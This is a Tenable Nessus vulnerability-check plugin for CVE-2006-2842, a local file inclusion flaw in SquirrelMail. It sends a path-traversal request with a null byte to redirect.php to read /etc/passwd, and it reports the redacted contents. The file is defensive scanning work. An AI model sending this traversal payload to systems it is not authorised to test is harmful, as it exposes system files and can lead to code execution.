#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(21630);
  script_version("1.21");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2006-2842");
  script_bugtraq_id(18231);

  script_name(english:"SquirrelMail plugin.php plugins Parameter Local File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
local file include issue.");
  script_set_attribute(attribute:"description", value:
"The version of SquirrelMail installed on the remote web server fails 
to properly sanitize user-supplied input to the 'plugins' parameter of 
the 'functions/plugin.php' script before using it in a PHP
'include_once()' function.  Provided PHP's 'register_globals' setting
is enabled, an unauthenticated attacker may be able to exploit this
issue to view arbitrary files or to execute arbitrary PHP code on the
remote host, subject to the privileges of the web server user id.");
  script_set_attribute(attribute:"see_also", value:"https://www.securityfocus.com/archive/1/435605/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://www.squirrelmail.org/security/issue/2006-06-01");
  script_set_attribute(attribute:"solution", value:
"Disable PHP's 'register_globals' setting or apply the patch referenced
in the project's advisory above.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/05/31");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/06/03");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:squirrelmail:squirrelmail");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("squirrelmail_detect.nasl");
  script_require_keys("www/squirrelmail");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/squirrelmail"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit the flaw to read a file.
  file = "../../../../../../../../../../etc/passwd";
  path = SCRIPT_NAME;
  r = http_send_recv3(method:"GET", port:port,
    item:string(dir, "/src/redirect.php?", "plugins[]=", file, "%00"));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # it looks like Squirrelmail and...
    "SquirrelMail" >< res &&
    # there's an entry for root
    egrep(pattern:"root:.*:0:[01]:", string:res)
  )
  {
    contents = res - strstr(res, "<br");
    contents = data_protection::redact_etc_passwd(output:contents);
    report = string(
      "Here are the contents of the file '/etc/passwd' that Nessus\n",
      "was able to read from the remote host :\n",
      "\n",
      contents
    );

    security_hole(port:port, extra:report);
    exit(0);
  }
}
